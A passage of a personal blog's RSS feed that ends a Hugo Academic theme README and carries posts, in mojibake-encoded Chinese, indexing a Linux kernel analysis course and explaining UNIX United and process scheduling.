&lt;li>&lt;strong>Stand Out&lt;/strong> - Bring your site to life with animation, parallax backgrounds, and scroll effects&lt;/li>
&lt;li>&lt;strong>One-Click Deployment&lt;/strong> - No servers. No databases. Only files.&lt;/li>
&lt;/ul>
&lt;h2 id="themes">Themes&lt;/h2>
&lt;p>Academic comes with &lt;strong>automatic day (light) and night (dark) mode&lt;/strong> built-in. Alternatively, visitors can choose their preferred mode - click the sun/moon icon in the top right of the
&lt;a href="https://academic-demo.netlify.com/" target="_blank" rel="noopener">Demo&lt;/a> to see it in action! Day/night mode can also be disabled by the site admin in &lt;code>params.toml&lt;/code>.&lt;/p>
&lt;p>
&lt;a href="https://sourcethemes.com/academic/themes/" target="_blank" rel="noopener">Choose a stunning &lt;strong>theme&lt;/strong> and &lt;strong>font&lt;/strong>&lt;/a> for your site. Themes are fully
&lt;a href="https://sourcethemes.com/academic/docs/customization/#custom-theme" target="_blank" rel="noopener">customizable&lt;/a>.&lt;/p>
&lt;h2 id="ecosystem">Ecosystem&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>
&lt;a href="https://github.com/sourcethemes/academic-admin" target="_blank" rel="noopener">Academic Admin&lt;/a>:&lt;/strong> An admin tool to import publications from BibTeX or import assets for an offline site&lt;/li>
&lt;li>&lt;strong>
&lt;a href="https://github.com/sourcethemes/academic-scripts" target="_blank" rel="noopener">Academic Scripts&lt;/a>:&lt;/strong> Scripts to help migrate content to new versions of Academic&lt;/li>
&lt;/ul>
&lt;h2 id="install">Install&lt;/h2>
&lt;p>You can choose from one of the following four methods to install:&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="https://sourcethemes.com/academic/docs/install/#install-with-web-browser" target="_blank" rel="noopener">&lt;strong>one-click install using your web browser (recommended)&lt;/strong>&lt;/a>&lt;/li>
&lt;li>
&lt;a href="https://sourcethemes.com/academic/docs/install/#install-with-git" target="_blank" rel="noopener">install on your computer using &lt;strong>Git&lt;/strong> with the Command Prompt/Terminal app&lt;/a>&lt;/li>
&lt;li>
&lt;a href="https://sourcethemes.com/academic/docs/install/#install-with-zip" target="_blank" rel="noopener">install on your computer by downloading the &lt;strong>ZIP files&lt;/strong>&lt;/a>&lt;/li>
&lt;li>
&lt;a href="https://sourcethemes.com/academic/docs/install/#install-with-rstudio" target="_blank" rel="noopener">install on your computer with &lt;strong>RStudio&lt;/strong>&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Then
&lt;a href="https://sourcethemes.com/academic/docs/get-started/" target="_blank" rel="noopener">personalize and deploy your new site&lt;/a>.&lt;/p>
&lt;h2 id="updating">Updating&lt;/h2>
&lt;p>
&lt;a href="https://sourcethemes.com/academic/docs/update/" target="_blank" rel="noopener">View the Update Guide&lt;/a>.&lt;/p>
&lt;p>Feel free to &lt;em>star&lt;/em> the project on
&lt;a href="https://github.com/gcushen/hugo-academic/" target="_blank" rel="noopener">Github&lt;/a> to help keep track of
&lt;a href="https://sourcethemes.com/academic/updates" target="_blank" rel="noopener">updates&lt;/a>.&lt;/p>
&lt;h2 id="license">License&lt;/h2>
&lt;p>Copyright 2016-present
&lt;a href="https://georgecushen.com" target="_blank" rel="noopener">George Cushen&lt;/a>.&lt;/p>
&lt;p>Released under the
&lt;a href="https://github.com/gcushen/hugo-academic/blob/master/LICENSE.md" target="_blank" rel="noopener">MIT&lt;/a> license.&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨_å­¦ä¹ ç´¢å¼</title><link>http://www.guozet.me/post/Linux-kernel-analysis-catalogue/</link><pubDate>Sun, 14 Jun 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-catalogue/</guid><description>&lt;p>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;h1 id="å­¦ä¹ ç®å½ç´¢å¼">å­¦ä¹ ç®å½ç´¢å¼&lt;/h1>
&lt;p>Linuxåæ ¸åæå­¦ä¹ åå®¢æ´çï¼&lt;/p>
&lt;p>
&lt;a href="../Linux-kernel-How-to-Work/">Linuxåæ ¸åæè¯¾ç¨1_è®¡ç®æºæ¯å¦ä½å·¥ä½ç&lt;/a>&lt;/p>
&lt;p>è®¡ç®æºçå·¥ä½è¿ç¨ï¼ä¸è¨ä»¥è½ä¹ï¼æ§è¡ç¨åºçè¿ç¨ï¼æä»¥åæè®¡ç®æºçå·¥ä½åçä¹å°±æ¯åæè®¡ç®æºå­å¨ç¨åºï¼æ§è¡ç¨åºçåçï¼æä»¥ï¼æä»¬å°±éè¦åéè¿äºè§£ç¨åºå­å¨çè¿ä¸ªè¿ç¨ã&lt;/p>
&lt;blockquote>
&lt;p>è¿ç¯åå®¢ä¸»è¦åæäºè®¡ç®æºçç»æåè®¡ç®æºçå·¥ä½åçï¼å¹¶ä¾ä¸¾Cè¯­è¨åæ±ç¼çè½¬åï¼æåç»åºäºç¨åºæ§è¡æ¶åå æ ååçå¨æç¤ºæå¾.&lt;/p>
&lt;/blockquote>
&lt;!-- more -->
&lt;p>
&lt;a href="../Linux-Kernel-analysis-Os-work/">Linuxåæ ¸åæè¯¾ç¨2_æä½ç³»ç»æ¯å¦ä½å·¥ä½ç&lt;/a>&lt;/p>
&lt;p>æä½ç³»ç»çå·¥ä½åçï¼å¯ä»¥è¯´æ¯è®¡ç®æºå·¥ä½åççç¬¬äºé¨åï¼ç¨åºæ§å¶çè¿ç¨ï¼ç¨åºæ§å¶çä½ç°æä¸­æ­ï¼ç³»ç»è°ç¨ï¼è¿ç¨è°åº¦ç­ã&lt;/p>
&lt;blockquote>
&lt;p>åå®¢ä¸­ä¸»è¦åæäºæä½ç³»ç»çå·¥ä½è¿ç¨ï¼ç¨äºä¸ä¸ªæ¶é´ä¸­æ­å½æ°æ¥æ¨¡æäºä¸­æ­ç¨åºæ§è¡çè¿ç¨ï¼å¹¶ç»åºäºç¸åºçå æ ååç¤ºæå¾ã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-Kernel-analysis-Start-Kernel-Function/">Linuxåæ ¸åæè¯¾ç¨3_start_kernel()å½æ°åæ&lt;/a>&lt;/p>
&lt;p>start_kernel()è¿ä¸ªå½æ°æ¯åæ ¸ç±å¼å¯¼ç¨åºå¼å¯¼ä»¥åï¼ç±èªè§£åç¨åºè§£åä»¥åæ§è¡çç¬¬ä¸ä¸ªå½æ°ï¼å¯ä»¥è®¤ä¸ºæ¯æ´ä¸ªåæ ¸çå¥å£å½æ°ï¼start_kernel()åçå·¥ä½å°±æ¯çº¿æ§çåå§åä¸äºåæ ¸çåºç¡æºå¶ï¼å¦ä¸­æ­ï¼åå­ç®¡çï¼è¿ç¨ç®¡çï¼ä¿¡å·ï¼æä»¶ç³»ç»ï¼KOç­ï¼æåå°±å¯å¨ä¸ä¸ªinitçº¿ç¨ï¼initçº¿ç¨åè¯»åæä»¶ç³»ç»éçinitç¨åºï¼åä¸ºç³»ç»çç¬¬ä¸ä¸ªè¿ç¨èå­å¨ï¼&lt;/p>
&lt;blockquote>
&lt;p>åå®¢ä¸­å¯¹linuxå¯å¨è¿ç¨ä¸­çstart_kernel()å½æ°è¿è¡åæï¼äºè§£å¶ä¸»è¦çå®ç°åè½ï¼å¨è¿éï¼ä¸»è¦å¯¹ä»£ç è¿è¡äºè§£æãä¸»è¦è§£æäºï¼start_kernel() -&amp;gt; rest_init() -&amp;gt; kernel_init() -&amp;gt; å¯å¨initè¿ç¨ã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-system-call/">Linuxåæ ¸åæè¯¾ç¨4_Linuxç³»ç»è°ç¨&lt;/a>&lt;br>
ç³»ç»è°ç¨ï¼é¡¾åæä¹ï¼è¯´çæ¯æä½ç³»ç»æä¾ç»ç¨æ·ç¨åºè°ç¨çä¸ç»âç¹æ®âæ¥å£ãç¨æ·ç¨åºå¯ä»¥éè¿è¿ç»âç¹æ®âæ¥å£æ¥è·å¾æä½ç³»ç»åæ ¸æä¾çæå¡ï¼æ¯å¦ç¨æ·å¯ä»¥éè¿æä»¶ç³»ç»ç¸å³çè°ç¨è¯·æ±ç³»ç»æå¼æä»¶ãå³é­æä»¶æè¯»åæä»¶ï¼å¯ä»¥éè¿æ¶éç¸å³çç³»ç»è°ç¨è·å¾ç³»ç»æ¶é´æè®¾ç½®å®æ¶å¨ç­ã&lt;/p>
&lt;p>ä»é»è¾ä¸æ¥è¯´ï¼ç³»ç»è°ç¨å¯è¢«çææ¯ä¸ä¸ªåæ ¸ä¸ç¨æ·ç©ºé´ç¨åºäº¤äºçæ¥å£ââå®å¥½æ¯ä¸ä¸ªä¸­é´äººï¼æç¨æ·è¿ç¨çè¯·æ±ä¼ è¾¾ç»åæ ¸ï¼å¾åæ ¸æè¯·æ±å¤çå®æ¯ååå°å¤çç»æéåç»ç¨æ·ç©ºé´ã&lt;/p>
&lt;blockquote>
&lt;p>åå®¢ä¸­è¯¦ç»çåæäºç³»ç»è°ç¨çåçï¼å®ç°æ¹å¼åæä¹ï¼APIï¼ç³»ç»è°ç¨ï¼ç³»ç»å½ä»¤ï¼åæ ¸å½æ°ä¹é´çåºå«ï¼æååå«ç¨Cè¯­è¨åæ±ç¼æ¥å®ç°äºexitç³»ç»è°ç¨ã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-interrupt/">Linuxåæ ¸åæè¯¾ç¨5_system_callä¸­æ­å¤çè¿ç¨&lt;/a>&lt;/p>
&lt;p>ç³»ç»è°ç¨æµç¨ä»ç»ï¼&lt;/p>
&lt;ol>
&lt;li>æ§è¡ç¨æ·ç¨åº(å¦:fork,exit)&lt;/li>
&lt;li>æ ¹æ®glibcä¸­çå½æ°å®ç°ï¼åå¾ç³»ç»è°ç¨å·å¹¶æ§è¡int $0x80äº§çä¸­æ­ã&lt;/li>
&lt;li>è¿è¡å°åç©ºé´çè½¬æ¢åå æ çåæ¢ï¼æ§è¡SAVE_ALLãï¼è¿è¡åæ ¸æ¨¡å¼ï¼&lt;/li>
&lt;li>è¿è¡ä¸­æ­å¤çï¼æ ¹æ®ç³»ç»è°ç¨è¡¨è°ç¨åæ ¸å½æ°ã&lt;/li>
&lt;li>æ§è¡åæ ¸å½æ°ã&lt;/li>
&lt;li>æ§è¡RESTORE_ALLå¹¶è¿åç¨æ·æ¨¡å¼&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>æ¬æä¸­ä½¿ç¨gdbè°è¯äºsys_exitç³»ç»è°ç¨ï¼å¹¶å¯¹ç³»ç»è°ç¨çæºä»£ç è¿è¡äºè¯¦ç»çåæã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-building-task/">Linuxåæ ¸åæè¯¾ç¨6_è¿ç¨åå»º&lt;/a>&lt;/p>
&lt;p>å¨ Linux åæ ¸ä¸­,ä¾ç¨æ·åå»ºè¿ç¨çç³»ç»è°ç¨fork()å½æ°çååºå½æ°æ¯ sys_fork()ãsys_clone()ãsys_vfork()ãè¿ä¸ä¸ªå½æ°é½æ¯éè¿è°ç¨åæ ¸å½æ° do_fork() æ¥å®ç°çã&lt;/p>
&lt;blockquote>
&lt;p>æ¬ç¯åå®¢è¯¦ç»åæäºè¿ç¨åå»ºè¿ç¨(fork())çè¯¦ç»æ§è¡è¿ç¨ã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-execve-Function/">Linuxåæ ¸åæè¯¾ç¨7_execve()å½æ°å¯¹åºçç³»ç»è°ç¨å¤çè¿ç¨&lt;/a>&lt;/p>
&lt;p>æèåºå¨æ¢¦ä¸ºè´è¶ï¼æ ©æ ©ç¶è´è¶ä¹ï¼èªå»éå¿ä¸ï¼ä¸ç¥å¨ä¹ãä¿ç¶è§ï¼åè§è§ç¶å¨ä¹ãä¸ç¥å¨ä¹æ¢¦ä¸ºè´è¶ä¸ï¼è´è¶ä¹æ¢¦ä¸ºå¨ä¸ï¼å¨ä¸è´è¶ï¼åå¿æåç£ãæ­¤ä¹è°ç©åãï¼ãåºå­Â·é½ç©è®ºãï¼&lt;br>
å¨æä»¬çæä½ç³»ç»ä¸­,ä¹æå¦æ­¤æµªæ¼«ææçåºçæ¢¦è¶ââexec()å½æ°æ.&lt;/p>
&lt;blockquote>
&lt;p>åå®¢ä¸­ä¸­å¯¹exec()å½æ°æè¿è¡äºä»ç»ï¼ä¹åå¯¹do_execve()å½æ°è¿è¡äºåæã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-task-management/">Linuxåæ ¸åæè¯¾ç¨8_è¿ç¨è°åº¦ä¸è¿ç¨åæ¢è¿ç¨&lt;/a>
è¿ç¨è°åº¦ä¸­schedule()å½æ°éæ©ä¸ä¸ªæ°çè¿ç¨æ¥è¿è¡ï¼å¹¶è°ç¨context_switchè¿è¡ä¸ä¸æçåæ¢ï¼è¿ä¸ªå®è°ç¨switch_toæ¥è¿è¡å³é®ä¸ä¸æåæ¢ã&lt;br>
ä¸»è¦è°ç¨è¿ç¨ï¼&lt;/p>
&lt;pre>&lt;code class="language-c">next = pick_next_task(rq, prev);//è¿ç¨è°åº¦ç®æ³é½å°è£è¿ä¸ªå½æ°åé¨
context_switch(rq, prev, next);//è¿ç¨ä¸ä¸æåæ¢
switch_toå©ç¨äºprevånextä¸¤ä¸ªåæ°ï¼prevæåå½åè¿ç¨ï¼nextæåè¢«è°åº¦çè¿ç¨
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>åå®¢ä¸­å¯¹scheduleå½æ°è¿è¡äºç¸å³ä»ç»ï¼ä»¥ååæäºscheduleå½æ°çåæ ¸å®ç°çè¯¦ç»æµç¨ã&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;a href="../Linux-kernel-analysis-UNIX-United-System/">Linuxåæ ¸åæè¯¾ç¨9_UNIX Unitedæä½ç³»ç»åæ&lt;/a>&lt;/p>
&lt;hr>
&lt;h1 id="å­¦ä¹ å¿å¾">å­¦ä¹ å¿å¾&lt;/h1>
&lt;h2 id="å¯¹linuxç³»ç»çè®¤è¯">å¯¹Linuxç³»ç»çè®¤è¯&lt;/h2>
&lt;p>å¾å¹¸è¿åå äºè¿ä¸ºæä¸¤ä¸ªæçMOOCè¯¾ç¨ãLinuxåæ ¸åæãï¼è®©æå¯¹Linuxç³»ç»æäºæ´æ·±çè®¤è¯ã&lt;/p>
&lt;ul>
&lt;li>Linuxç³»ç»çå¼æºææ³æ¯æå¼å¾æä»¬å­¦ä¹ çï¼å¼æºçææ³ä¹ä¼æä¸ºæä»¬è½¯ä»¶è¡ä¸çä¸»å¯¼çã&lt;/li>
&lt;li>Linuxç³»ç»æä¸ºæ ¸å¿ä¹å°±æ¯è¿ç¨è°åº¦ï¼ä¸­æ­å¤çï¼æ¶éåæä»¶ç³»ç»ï¼æä»¬åªè¦å¯¹è¿å ä¸ªæ¹é¢äºè§£å°äºï¼ä¹å°±äºè§£äºLinuxç³»ç»çå³é®äºã&lt;/li>
&lt;/ul>
&lt;h2 id="å­¦ä¹ linuxåæ ¸çå¿å¾">å­¦ä¹ Linuxåæ ¸çå¿å¾&lt;/h2>
&lt;p>å­¦ä¹ Linuxåæ ¸çè¿ç¨ä¹åå¹´å¤äºï¼ä»åµå¥å¼ç³»ç»è®¾è®¡ä¸­çucosåæ­¥è®¤è¯æä½ç³»ç»(æ ¸å¿ï¼è¿ç¨è°åº¦)ï¼åµå¥å¼æä½ç³»ç»ä¸­çï¼ARMä¸­çLinuxï¼åå°Linuxåæ ¸åæ(x86ä½ç³»ä¸)ï¼ä¸æ­¥ä¸æ­¥çæ·±å¥ï¼å¨è¿ä¸ªè¿ç¨ä¸­ï¼æå æ¬ä¹¦å¯¹æå½±åå¾å¤ï¼ç»å¤§å®¶æ¨èä¸ä¸:&lt;/p>
&lt;p>ãLinuxåæ ¸è®¾è®¡ä¸å®ç°ãï¼æ³å­¦ä¹ linuxåæ ¸å°±è¦åäºè§£ç¸åºçæºå¶ä¹ååå»çæºä»£ç çè¯ï¼å¯è½ä¼æ¶è·å°æ´å¤ï¼èè¿æ¬ä¹¦ä»ç»äºè¯¸å¦è¿ç¨ç®¡çãç³»ç»è°ç¨ãä¸­æ­åä¸­æ­å¤çç¨åºãåæ ¸åæ­¥ãæ¶é´ç®¡çãåå­ç®¡çãå°åç©ºé´ãè°è¯ææ¯ç­æ¹é¢ï¼åå®¹æ¯è¾æµæ¾ææï¼æ¯è¾éåå­¦ä¹ Linuxåæ ¸çæ°äºº.&lt;/p>
&lt;p>ä¹åå°±ä¸å¾ä¸æå°ãæ·±å¥çè§£Linuxåæ ¸ãè¿æ¬ä¹¦äºï¼è¿æ¬æå¥½æ¯è½æ·±å¥å­¦ä¹ ãç®èè¨ä¹ï¼ç¬¬ä¸æ¬ï¼æçº²æ§éè¯»ï¼ç¬¬äºæ¬ï¼éåæ·±å¥éè¯»ã&lt;/p>
&lt;p>å½ç¶ï¼çº¸ä¸å¾æ¥ç»è§æµï¼ç»ç¥æ­¤äºè¦èº¬è¡ï¼å¨ä¹¦æ¬å­¦ä¹ çåºç¡ä¸ï¼éè¦æä»¬å©ç¨å¥½gdbè¿ä¸ªè°è¯å·¥å·ï¼å¤è·è¸ªä¸ä¸åæ ¸çä¸äºæºå¶çæ§è¡æµç¨ï¼å¨å®è·µä¸­éªè¯ç¥è¯ï¼æè½æ´å¥½çææ¡ç¥è¯ã&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨9_UNIX Unitedæä½ç³»ç»åæ</title><link>http://www.guozet.me/post/Linux-kernel-analysis-UNIX-United-System/</link><pubDate>Thu, 07 May 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-UNIX-United-System/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬ä¹å¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;p>UNIXæä½ç³»ç»ï¼æ¯ä¸ä¸ªå¼ºå¤§çå¤ç¨æ·ãå¤ä»»å¡æä½ç³»ç»ï¼æ¯æå¤ç§å¤çå¨æ¶æï¼æç§æä½ç³»ç»çåç±»ï¼å±äºåæ¶æä½ç³»ç»&lt;/p>
&lt;blockquote>
&lt;p>UNIX United is an architecture for a distributed system based on UNIX. &lt;br>
UNIX Unitedå¯ä»¥çåæ¯ä¸ç§å¤å°UNIXç»æåå¸å¼ç³»ç»çè§£å³æ¹æ¡ã&lt;/p>
&lt;/blockquote>
&lt;h1 id="1introduction">1.Introduction&lt;/h1>
&lt;p>UNIX Unitedç³»ç»æ¯éè¿å°ä¸ç»çUNIXç³»ç»è®¡ç®æºï¼å¨ä¸å±å å ä¸ä¸ªç³»ç»æ¹å¼ï¼æ¯å¼å¨æä½çæ¶åï¼å®å¨éèææçå¤çå¨éä¿¡åç½ç»åè®®ãå¹¶ä¸ææçUNUXå·¥ä½æ¹å¼ï¼å¦ï¼è®¾å¤ä¿æ¤ï¼è®¿é®åæä»¶è®¿é®ï¼è¿ç¨é´éä¿¡ï¼è¾å¥/è¾åºï¼éå®åï¼é½æ¯ä¸æ ·çï¼åç¬ç«çUNIXæ²¡æä»»ä½å·®å«ã&lt;/p>
&lt;blockquote>
&lt;p>åèæç®ï¼
ãThe Newcastle Connection or UNIXes of the world Unite!ã
ãThe Architecture of UNIX Unitedã&lt;/p>
&lt;/blockquote>
&lt;!-- more -->
&lt;p>&lt;strong>çé®ï¼å¯¹æä»¶è®¿é®çæ§å¶æ¯æä¹å¤ççå¢ï¼&lt;/strong>&lt;/p>
&lt;h1 id="2å¯¹æä»¶è®¿é®çå¤ç">2.å¯¹æä»¶è®¿é®çå¤ç&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-30-Linux-kernel-analysis-UNIX-United-System/2018-09-19-02-08-10.png" alt="">&lt;/p>
&lt;p>ç®åçä¸¾ä¸ä¸ªä¾å­ï¼æä»¬æä¸¤ä¸ªç¬ç«çUNIXç³»ç»ä¸»æºï¼ç°å¨å°å¶æå»ºæUNIX United System, æå»ºä¹åï¼UNIX1çç¨æ·å¦ä½è¯»åUNIX2çæä»¶å¢ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-30-Linux-kernel-analysis-UNIX-United-System/2018-09-19-02-08-21.png" alt="">&lt;/p>
&lt;p>ããä¸ç¥éå¤§å®¶æ¯å¦è¿è®°å¾: &lt;strong>â / â è¡¨ç¤ºæ ¹ç®å½ï¼â&lt;/strong> .. âè¡¨ç¤ºå½åç®å½çä¸ä¸å±ç®å½ï¼é£ä¹é®é¢æ¥äºï¼â /.. âè¡¨ç¤ºä»ä¹å¢ï¼&lt;/p>
&lt;blockquote>
&lt;p>å¦æå¨UNIXï¼ä¸»æºä¸å¤å¶æä»¶aå°UNIXï¼ä¸ï¼å¯ä»¥è¿æ ·æä½ã
cp /user/brian/a /../unix2/user/brian/a
ç°å¨é®é¢åä¸æ¬¡åºç°ï¼è¿ä¸ªcpä½¿ç¨çæ¯UNIX1ä¸­çcpè¿æ¯UNIX2ä¸­çcpå¢ï¼&lt;/p>
&lt;/blockquote>
&lt;h1 id="ï¼ç¨æ·è®¤è¯åè®¿é®æéæ§å¶">ï¼.ç¨æ·è®¤è¯åè®¿é®æéæ§å¶&lt;/h1>
&lt;p>UNIXä¸­ç¨æ·è®¤è¯ç¸å³çæä»¶ï¼ç¨æ·ï¼ç»ï¼ç¨æ·å¯ç ï¼Root
UNIX United Systemä¸­ï¼åä¸ªå­UNIX Systemæ¥æèªå·±ç¬ç«çusers,user groups and user password file,root; ä½æ¯ä¸ªç³»ç»é½æä¹å¡å¯¹è¦ç»å½UNIX United Systemçç¨æ·è¿è¡è®¤è¯ï¼é£æä¹è®¤è¯å¢ï¼
æ¯å¦æºå¨Aä¸çç¨æ·u, æä»¬è®°ä¸ºâA/uâï¼èº«ä»½è®¤è¯ç±Aå®æï¼ä½ç¨æ·uå¯ä»¥è®¿é®ææAåBä¸å±äºè¯¥ç¨æ·çæä»¶ã&lt;/p>
&lt;h1 id="4è¿æ¥éä¿¡-è¿ç¨æä»¶è®¿é®çå¤ç">4.è¿æ¥éä¿¡-è¿ç¨æä»¶è®¿é®çå¤ç&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-30-Linux-kernel-analysis-UNIX-United-System/2018-09-19-02-08-37.png" alt="">&lt;/p>
&lt;p>å¨åæUNIXçåºç¡ä¸æ·»å äºä¸ä¸ªéä¿¡é¾è·¯åä¸ä¸ªè½¯ä»¶å±, è¿ä¸¤é¨åçä½ç½®å¨UNIX KernelåUNIX softwareä¹é´ãNewcastle Connectionç¸å½äºæ¯ä¸ä¸ªâè¿æ»¤å¨âï¼è¿æ»¤åºè¦éå®åå¶ä»ç³»ç»çç³»ç»è°ç¨ï¼èUNIX1åUNIX2ä¹é´çéä¿¡æ¯éè¿è¿ç¨è¿ç¨è°ç¨(Remote Procedure Callï¼RPC)æ¥äº¤æµçã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-30-Linux-kernel-analysis-UNIX-United-System/2018-09-19-02-09-48.gif" alt="">&lt;/p>
&lt;p>æµç¨å¦ä¸æç¤ºï¼&lt;/p>
&lt;ol>
&lt;li>ä¸å±åºç¨ååºä¸ä¸ªç³»ç»è°ç¨ï¼&lt;/li>
&lt;li>Newcastle Connectionæ£æµè¯¥ç³»ç»è°ç¨æ¯ä¸æ¯è¿ç¨è°ç¨ï¼ä¸æ¯è¿ç¨è°ç¨åç´æ¥è½¬æ¢ä¸ºæ¬å°çç³»ç»è°ç¨ï¼åæ ¸æå¡ï¼ï¼å¦ææ¯å¯¹è¿ç¨çæä»¶è¿ç¨æä½ï¼åæ¯è¿ç¨è°ç¨ã&lt;/li>
&lt;li>è¿ç¨è°ç¨ï¼åéè¿è¿æ¥å±å°å½ä»¤(å ä¸é¢å¤ä¿¡æ¯ï¼å¦å½åç¨æ·id)åéå°è¿ç¨ä¸»æºä¸ï¼è¿æ¥å±ç¸å½äºç®¡éï¼è¿æ¥äºUNIX1åUNIX2ï¼;&lt;/li>
&lt;li>è¿æ¥å±è§£ææä»¶çåç§°ï¼å¦ï¼ /../UNIX2/ï¼å°å¶ä¼ éç»å¯¹åºçè®¡ç®æºã&lt;/li>
&lt;li>è¿ç¨ä¸»æºè°ç¨å¯¹åºè¿ç¨æ¥å¤çï¼å³UNIX Unitedä¸­åªææ¬å°æä½ï¼ï¼è¿ç¨ä¸»æºè¿åæ§è¡æåµ&lt;/li>
&lt;/ol></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨8_è¿ç¨è°åº¦ä¸è¿ç¨åæ¢è¿ç¨</title><link>http://www.guozet.me/post/Linux-kernel-analysis-task-management/</link><pubDate>Sun, 22 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-task-management/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬å«å¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã
ååä½åè½¬è½½è¯·æ³¨æåºå¤
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;hr>
&lt;h1 id="ä¸scheduleå½æ°ä»ç»">ä¸.schedule()å½æ°ä»ç»&lt;/h1>
&lt;h2 id="ï¼è¿ç¨è°åº¦çæ¶æº">ï¼.è¿ç¨è°åº¦çæ¶æº&lt;/h2>
&lt;p>ä¸­æ­å¤çè¿ç¨ï¼åæ¬&lt;strong>æ¶éä¸­æ­ãI/Oä¸­æ­ãç³»ç»è°ç¨åå¼å¸¸&lt;/strong>ï¼ä¸­ï¼ç´æ¥è°ç¨schedule()ï¼æèè¿åç¨æ·ææ¶æ ¹æ®need_reschedæ è®°è°ç¨schedule()ï¼&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>åæ ¸çº¿ç¨&lt;/strong>å¯ä»¥&lt;strong>ç´æ¥&lt;/strong>è°ç¨&lt;strong>schedule()&lt;strong>è¿è¡è¿ç¨åæ¢ï¼ä¹å¯ä»¥å¨ä¸­æ­å¤çè¿ç¨ä¸­è¿è¡è°åº¦ï¼ä¹å°±æ¯è¯´åæ ¸çº¿ç¨ä½ä¸ºä¸ç±»çç¹æ®çè¿ç¨å¯ä»¥ä¸»å¨è°åº¦ï¼ä¹å¯ä»¥è¢«å¨è°åº¦ï¼&lt;br>
&lt;/strong>ç¨æ·æè¿ç¨æ æ³å®ç°ä¸»å¨è°åº¦ï¼ä»è½éè¿é·å¥åæ ¸æåçæä¸ªæ¶æºç¹è¿è¡è°åº¦&lt;/strong>ï¼å³å¨ä¸­æ­å¤çè¿ç¨ä¸­è¿è¡è°åº¦ã&lt;/p>
&lt;/blockquote>
&lt;h2 id="2è¿ç¨çåæ¢">2.è¿ç¨çåæ¢&lt;/h2>
&lt;p>ä¸ºäºæ§å¶è¿ç¨çæ§è¡ï¼åæ ¸å¿é¡»æè½åæèµ·æ­£å¨CPUä¸æ§è¡çè¿ç¨ï¼å¹¶æ¢å¤ä»¥åæèµ·çæä¸ªè¿ç¨çæ§è¡ï¼è¿å«åè¿ç¨åæ¢ãä»»å¡åæ¢ãä¸ä¸æåæ¢ï¼&lt;/p>
&lt;p>æèµ·æ­£å¨CPUä¸æ§è¡çè¿ç¨ï¼ä¸ä¸­æ­æ¶ä¿å­ç°åºæ¯ä¸åçï¼ä¸­æ­ååæ¯å¨åä¸ä¸ªè¿ç¨ä¸ä¸æä¸­ï¼åªæ¯ç±ç¨æ·æè½¬ååæ ¸ææ§è¡ï¼&lt;/p>
&lt;p>è¿ç¨ä¸ä¸æåå«äºè¿ç¨æ§è¡éè¦çææä¿¡æ¯ï¼&lt;/p>
&lt;ol>
&lt;li>ç¨æ·å°åç©ºé´: åæ¬ç¨åºä»£ç ï¼æ°æ®ï¼ç¨æ·å æ ç­&lt;/li>
&lt;li>æ§å¶ä¿¡æ¯: è¿ç¨æè¿°ç¬¦ï¼åæ ¸å æ ç­&lt;/li>
&lt;li>ç¡¬ä»¶ä¸ä¸æï¼æ³¨æä¸­æ­ä¹è¦ä¿å­ç¡¬ä»¶ä¸ä¸æåªæ¯ä¿å­çæ¹æ³ä¸åï¼&lt;/li>
&lt;/ol>
&lt;!-- more -->
&lt;h2 id="3å·ä½è¿ç¨åæ¢çä»£ç åæ">3.å·ä½è¿ç¨åæ¢çä»£ç åæ&lt;/h2>
&lt;p>&lt;strong>schedule()å½æ°&lt;/strong>éæ©ä¸ä¸ªæ°çè¿ç¨æ¥è¿è¡ï¼å¹¶è°ç¨&lt;strong>context_switch&lt;/strong>è¿è¡ä¸ä¸æçåæ¢ï¼è¿ä¸ª&lt;strong>å®è°ç¨switch_to&lt;/strong>æ¥è¿è¡å³é®ä¸ä¸æåæ¢ï¼&lt;/p>
&lt;blockquote>
&lt;p>ä¸»è¦è°ç¨è¿ç¨ï¼&lt;/p>
&lt;ol>
